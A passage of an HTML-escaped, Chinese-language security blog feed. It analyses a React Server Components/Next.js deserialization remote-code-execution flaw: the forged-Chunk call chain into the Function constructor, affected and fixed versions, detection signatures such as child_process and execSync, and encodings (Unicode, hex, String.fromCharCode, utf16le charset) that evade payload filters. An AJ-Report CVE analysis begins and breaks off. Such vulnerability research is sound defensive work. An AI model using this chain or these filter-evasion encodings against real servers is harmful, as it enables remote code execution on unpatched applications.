+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;_response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;_formData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;Function&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;Function&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;到此完成了假 Chunk 的伪造——&lt;code&gt;Chunk[0].value&lt;/code&gt;。&lt;/p&gt;
+&lt;h3 id="44-调用恶意函数"&gt;4.4 调用恶意函数
+&lt;/h3&gt;&lt;p&gt;遍历完 &lt;code&gt;Chunk[0].value&lt;/code&gt;所有元素之后， &lt;code&gt;reviveModel()&lt;/code&gt;函数结束，回到 &lt;code&gt;initializeModelChunk()&lt;/code&gt; 函数，&lt;code&gt;Chunk[0].status&lt;/code&gt; 的值修改为 “fulfilled”，然后回到 &lt;code&gt;Chunk[0].then()&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Chunk[0].then()&lt;/code&gt; 执行 &lt;code&gt;resolve(Chunk[0].value) &lt;/code&gt;，进入 &lt;code&gt;Chunk[0].value.then()&lt;/code&gt;。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// Chunk[0].status = &amp;#34;fulfilled&amp;#34; =&amp;gt; resolve(Chunk[0].value)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;initializeModelChunk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;{&amp;#34;&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;: &amp;#34;&lt;/span&gt;&lt;span class="nx"&gt;$B&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;}&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$B&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;reviveModel&lt;/span&gt;&lt;span class="p"&gt;(...,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$B&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;},...)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;reviveModel&lt;/span&gt;&lt;span class="p"&gt;(...,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$B&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,...)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;parseModelString&lt;/span&gt;&lt;span class="p"&gt;(...,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$B&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,...)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;_response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;_formData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;_response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;_prefix&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;parseInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;fulfilled&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Function&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;eval_code&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;resolve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;quot;$B&amp;quot;&lt;/code&gt; ：Blob 对象引用；&lt;code&gt;&amp;quot;$B&amp;quot;&lt;/code&gt;后的字符串内容无所谓，满足可以按照十六进制解析即可。&lt;/li&gt;
+&lt;li&gt;针对真实 Chunk 来获取 formData 的操作被 &lt;code&gt;&amp;quot;Chunk[0].value._response._formData.get&amp;quot;&lt;/code&gt; 覆盖，实际调用的是函数构造器 &lt;code&gt;[Function: Function]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;函数构造器的参数是指定的恶意代码；真实 Chunk 的&lt;code&gt;_response._prefix&lt;/code&gt; 值是一个空字符串 &lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;resolve(Chunk[0].value.value) &lt;/code&gt; =&amp;gt; &lt;code&gt;Chunk[0].value.value.then()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="0x05-影响范围"&gt;0x05 影响范围
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;影响版本：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;React Server 19.0.0&lt;/li&gt;
+&lt;li&gt;React Server 19.0.1 (注：部分早期补丁未完全覆盖)&lt;/li&gt;
+&lt;li&gt;React Server 19.1.*&lt;/li&gt;
+&lt;li&gt;React Server 19.2.0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;其他受影响组件/应用：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Next.js v15.0.0 - v15.0.4&lt;/li&gt;
+&lt;li&gt;Next.js v15.1.0 - v15.1.8&lt;/li&gt;
+&lt;li&gt;Next.js v15.2.x - v15.5.6&lt;/li&gt;
+&lt;li&gt;Next.js v16.0.0 - v16.0.6&lt;/li&gt;
+&lt;li&gt;Next.js v14.3.0-canary.77 及以上 Canary 版本&lt;/li&gt;
+&lt;li&gt;Dify、NextChat 等通用产品&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;修复版本：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;React: 19.0.1+, 19.1.2+, 19.2.1+&lt;/li&gt;
+&lt;li&gt;Next.js: 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="0x06-检测与绕过"&gt;0x06 检测与绕过
+&lt;/h2&gt;&lt;h3 id="61-可检测特征"&gt;6.1 可检测特征
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;对象属性/固定特征：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;POST 请求方法&lt;/li&gt;
+&lt;li&gt;&amp;ldquo;then&amp;rdquo;，&amp;ldquo;status&amp;rdquo;，&amp;ldquo;reason&amp;rdquo;，&amp;quot;_response&amp;quot;，&amp;quot;_prefix&amp;quot;，&amp;quot;_formData&amp;quot;&lt;/li&gt;
+&lt;li&gt;__proto__:then，constructor:constructor&lt;/li&gt;
+&lt;li&gt;$B，$@&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;常用恶意payload特征：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;process.mainModule.require&lt;/li&gt;
+&lt;li&gt;child_process&lt;/li&gt;
+&lt;li&gt;execSync / exec / spawn / spawnSync / execFileSync&lt;/li&gt;
+&lt;li&gt;fs.readFileSync / fs.writeFileSync&lt;/li&gt;
+&lt;li&gt;vm.runInThisContext / vm.runInNewContext&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="62-攻击结果检测"&gt;6.2 攻击结果检测
+&lt;/h3&gt;&lt;p&gt;由于最后执行代码是通过链式调用 thenable 对象的 then 方法，当前对象返回的 status 由攻击者控制，整体响应由实际的应用环境封装控制，所以：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果有回显，可以校验响应内容来判断常规命令执行的结果&lt;/li&gt;
+&lt;li&gt;攻击成功不一定返回 positive 响应；negative 响应不一定表示攻击失败&lt;/li&gt;
+&lt;li&gt;没有响应(阻塞)不一定表示攻击失败&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="63-payload-绕过"&gt;6.3 payload 绕过
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;✅ Unicode 编码&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;如：&lt;code&gt;child_process&lt;/code&gt; = &amp;gt; &lt;code&gt;\u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在构造假 Chunk 的 JSON 数据部分，不区分键名/键值，所有字符串都可以进行 Unicode 编码，不影响解析。&lt;/p&gt;
+&lt;p&gt;不过不支持 Java 中常见的如 &lt;code&gt;\uuu0063&lt;/code&gt; 等变种。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;✅ 十六进制编码&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;如：&lt;code&gt;child_process&lt;/code&gt; =&amp;gt; &lt;code&gt;\x63hild_process&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;可行，但仅限在 &lt;code&gt;_response._prefix&lt;/code&gt; 的恶意代码的语句参数部分，语句本身不行；固定的 JSON 键值对内容不行。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;✅ String.fromCharCode()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;如：&lt;code&gt;'child_process'&lt;/code&gt; =&amp;gt; &lt;code&gt;'child_' + String.fromCharCode(112,114,111,99,101,115,115)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;可行，但仅限在 &lt;code&gt;_response._prefix&lt;/code&gt; 的恶意代码的语句参数部分，语句本身不行；固定的 JSON 键值对内容不行。&lt;/p&gt;
+&lt;p&gt;可知，以下变种也可：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;'child_process'&lt;/code&gt; =&amp;gt; &lt;code&gt;'child_' + String.fromCharCode(0o160, 0o162, 0o157, 0o143, 0o145, 0o163, 0o163)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;'child_process'&lt;/code&gt; =&amp;gt; &lt;code&gt;'child_' + String.fromCharCode(0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;'child_process'&lt;/code&gt; =&amp;gt; &lt;code&gt;'child_' + String.fromCharCode(0b1110000, 0b1110010, 0b1101111, 0b1100011, 0b1100101, 0b1110011, 0b1110011)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;'child_process'&lt;/code&gt; =&amp;gt; &lt;code&gt;'child_' + String.fromCharCode(112, 114, 0o157, 0O143, 0x65, 0x73, 0b1110011)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;String.fromCharCode(112, 114, ...) &lt;/code&gt; =&amp;gt; &lt;code&gt;const abc = String.fromCharCode; abc(112, 114, ...)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;✅ 字符集&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;请求数据由 busboy 进行处理，busboy 支持提取不同的字符集进行对应解码，如：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Content-Disposition: form-data; name=&amp;#34;0&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{&amp;#34;then&amp;#34;:&amp;#34;$1:__proto__:then&amp;#34;...constructor&amp;#34;}}}
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;↓↓↓
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Content-Disposition: form-data; name=&amp;#34;0&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Content-Type: text/plane;charset=utf16le
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{.&amp;#34;.t.h.e.n.&amp;#34;.:.&amp;#34;.$.1.:._._.p.r.o.t.o._._.:.t.h.e.n.&amp;#34;....c.o.n.s.t.r.u.c.t.o.r.&amp;#34;.}.}.}.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;// . =&amp;gt; \x00
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;❌ URL 编码&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;实测不论是 JSON 键值对内容，还是 &lt;code&gt;_response._prefix&lt;/code&gt; 的恶意代码部分，URL 编码后解析都会报错。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;❌ 大小写&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;实测不行，JS 大小写敏感。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;❌ 插入特殊字符&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在 payload 中插入&lt;code&gt;\t\n&lt;/code&gt;等空白字符或不可见字符，如：
+&lt;code&gt;constructor:constructor&lt;/code&gt; =&amp;gt; &lt;code&gt;constructor : constructor&lt;/code&gt;
+&lt;code&gt;constructor:constructor&lt;/code&gt; =&amp;gt; &lt;code&gt;constructor\t:\tconstructor&lt;/code&gt;
+&lt;code&gt;constructor:constructor&lt;/code&gt; =&amp;gt; &lt;code&gt;constructor\n:\nconstructor&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;实测不行。&lt;/p&gt;</description></item><item><title>AJ-Report validationRules参数远程代码执行漏洞分析(CVE-2024-7314)</title><link>https://example.com/p/aj-report-validationrules%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2024-7314/</link><pubDate>Thu, 16 Oct 2025 15:01:26 +0800</pubDate><guid>https://example.com/p/aj-report-validationrules%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2024-7314/</guid><description>&lt;h2 id="0x00-前言"&gt;0x00 前言
 &lt;/h2&gt;&lt;p&gt;&lt;code&gt;AJ-Report&lt;/code&gt; 是一个开源的可视化设计工具，基于 &lt;code&gt;Spring Boot&lt;/code&gt; 框架开发，依赖Java版本为 &lt;code&gt;JDK 8&lt;/code&gt;。&lt;/p&gt;
 &lt;p&gt;由于漏洞利用需要通过特定 URL 进行参数传递，而该 URL 访问需要经过权限校验，所以利用该漏洞前提是获取对应的用户权限或想办法绕过权限校验。&lt;/p&gt;
 &lt;h3 id="swagger-ui-截断绕过漏洞"&gt;swagger-ui 截断绕过漏洞
